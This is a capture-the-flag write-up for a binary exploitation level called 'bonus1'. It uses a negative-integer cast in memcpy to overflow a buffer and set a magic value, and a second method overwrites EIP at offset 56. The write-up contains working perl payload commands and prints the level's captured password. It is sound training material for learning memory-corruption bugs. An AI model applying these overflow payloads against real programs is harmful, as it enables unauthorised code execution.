# bonus1

The source of this level is quite simple.

All we need is to enter a number inferior to 9 (first argument) and a string (second argument).

The program will copy `x` bytes from the second argument to the string. `x` is 4x the number.

To exec `/bin/sh`, the number need to be exactly `0x574f4c46 -> 1464814662`.

# Exploit

If we enter a negative number, this number is inferior to 9 and in the memcpy, the number will be casted to a positive number.

The number variable is 40 oct after the string so we only need to copy 44 chars.

```bash
# ./bonus1 <int-min>-11 "40 char + 1464814662"
> ./bonus1 -2147483637 "`perl -e 'print "A"x40 . "\x46\x4c\x4f\x57"'`"
cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

```
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

# Alternative
Let's use underflow to pass the security

```
-4294967296 = 0
(-4294967296 + 100)/4 = -1073741799
```

```
r -1073741799 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

pattern search
Registers contain pattern buffer:
EIP+0 found at offset: 56
```

# Exploit 2

We just need to set EIP to jump to:
`0x08048482 <+94>:	movl   $0x0,0x8(%esp)`
`0x 08 04 84 82`

```bash
> ./bonus1 -1073741799 $(perl -e 'print "A"x(56) . "\x82\x84\x04\x08" . "A"x(100 - 56 - 4)')

sh: 1: nonzero_return: not found
\[\e[32m\]\u\[\e[m\] \[\e[33m\]\w\[\e[m\] \[\e[31m\]\[\e[m\]$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
